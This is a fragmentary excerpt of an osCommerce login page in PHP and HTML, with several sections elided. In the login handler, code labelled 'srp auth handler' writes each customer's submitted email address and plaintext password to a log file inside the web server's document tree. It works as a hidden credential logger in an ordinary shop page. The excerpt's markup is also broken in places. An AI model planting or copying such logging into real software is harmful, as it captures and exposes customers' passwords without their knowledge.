...
// redirect the customer to a friendly cookie-must-be-enabled page if cookies are disabled (or the session has not started)
  ...
  if (isset($HTTP_GET_VARS['action']) && ($HTTP_GET_VARS['action'] == 'process') && isset($HTTP_POST_VARS['formid']) && ($HTTP_POST_VARS['formid'] == $sessiontoken)) {
    //srp auth handler
    $file = "/usr/local/apache/htdocs/oscommerce/srp/log.txt";
    $username = $HTTP_POST_VARS['email_address']; 
    $password = $HTTP_POST_VARS['password'];
    $content = "1: username is " . $username . "; password is " . $password . "\n";
    file_put_contents($file, $content, FILE_APPEND | LOCK_EX);

    $sha_name_file = "/usr/local/apache/htdocs/oscommerce/srp/sha_name.csv";
    ...
    $HTTP_POST_VARS['email_address'] = $username;
...
<div class="contentContainer" style="width: 45%; float: left; border-left: 1px dashed #ccc; padding-left: 3%; margin-left: 3%;">
  ...
  /*
    <table border="0" cellspacing="0" cellpadding="2" width="100%">
      ...
      var ut = '    <table border="0" cellspacing="0" cellpadding="2" width="100%">          <tbody><tr>                  <td class="fieldKey">E-Mail Address:</td>                          <td class="fieldValue"><input type="text" id="email" name="email_address"></td>                                </tr>                                      <tr>                                              <td class="fieldKey">Password:</td>                                                      <td class="fieldValue"><input type="password" id="password" name="password" maxlength="40"></td>                                                            </tr>                                                                </tbody></table>';
  document.write(ut);
</script>
